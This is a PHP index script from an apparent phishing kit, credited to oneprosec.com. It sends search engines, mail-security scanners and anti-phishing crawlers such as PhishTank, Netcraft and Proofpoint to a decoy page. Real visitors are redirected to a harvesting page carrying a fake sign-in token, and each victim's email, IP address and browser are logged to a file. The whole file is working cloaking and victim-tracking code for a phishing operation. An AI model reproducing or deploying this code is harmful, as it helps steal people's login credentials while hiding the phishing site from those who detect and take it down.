<?php
/*
======================= Coded By oneprosec.com ======================
*/
session_start();
error_reporting(0);
$path = "./site/";
include('./BOTS/get_ip.php');
include('./BOTS/antibots1.php');
include('./BOTS/antibots2.php');
include('./BOTS/antibots3.php');
include('./BOTS/antibots4.php');
include('./BOTS/get_browser.php');
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { include($path."index.php"); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { include($path."index.php"); exit(); }
function is_bitch($user_agent){
    $bitchs = array(
        'Googlebot',
        'Gmail', 
        'Baiduspider', 
        'ia_archiver',
        'R6_FeedFetcher', 
        'NetcraftSurveyAgent', 
        'Sogou web spider',
        'bingbot', 
        'Yahoo! Slurp', 
        'facebookexternalhit', 
        'PrintfulBot',
        'msnbot', 
        'Twitterbot', 
        'UnwindFetchor', 
        'urlresolver', 
        'Butterfly', 
        'TweetmemeBot',
        'PaperLiBot',
        'MJ12bot',
        'AhrefsBot',
        'Exabot',
        'Ezooms',
        'YandexBot',
        'SearchmetricsBot',
	    'phishtank',
	    'PhishTank',
        'picsearch',
        'TweetedTimes Bot',
        'QuerySeekerSpider',
        'ShowyouBot',
        'woriobot',
        'merlinkbot',
        'BazQuxBot',
        'Kraken',
        'SISTRIX Crawler',
        'R6_CommentReader',
        'magpie-crawler',
        'GrapeshotCrawler',
        'PercolateCrawler',
        'MaxPointCrawler',
        'R6_FeedFetcher',
        'NetSeer crawler',
        'grokkit-crawler',
        'SMXCrawler',
        'PulseCrawler',
        'Y!J-BRW',
        '80legs.com/webcrawler',
        'Mediapartners-Google', 
        'Spinn3r', 
        'InAGist', 
        'Python-urllib', 
        'NING', 
        'TencentTraveler',
        'Feedfetcher-Google', 
        'mon.itor.us', 
        'spbot', 
        'Feedly',
        'bot',
        'curl',
        "spider",
        "outlook",
        "hotmail",
        "microsoft",
        "office365",
        "proofpoint",
        "mail.ru",
        "crawler");
    	foreach($bitchs as $bitch){
            if( stripos( $user_agent, $bitch ) !== false ) return true;
        }
    	return false;
}
if (is_bitch($_SERVER['HTTP_USER_AGENT'])) {
    include($path."index.php");
    exit;
}
$browser = X_Browser($_SERVER['HTTP_USER_AGENT']);
if($browser == "Unknown Browser"){
   exit;
}
$_SESSION ['authenticator'] = $authenticator = "?signin=".md5($_SESSION['_LOOKUP_CNTRCODE_'])."&auth=".md5(microtime()).sha1(microtime());
$location = "l";
if (isset($_GET['email'])) {
	$email = $_SESSION['e'] = $_GET['email'];
	if(!filter_var($email, FILTER_VALIDATE_EMAIL)){
		include($path."index.php"); exit();
	}
}else {
    $location = "s";
}
$visitor = fopen("visitors.txt", "a");
fwrite($visitor, "| ".$email." | ".$_SERVER['REMOTE_ADDR']. " | ".$_SERVER['HTTP_USER_AGENT']." | ".date("Y-m-d | h:i:s")." |"."\r\n");
fclose($visitor);
header("LOCATION: ./".$location."/".$authenticator, true, 303);
?>
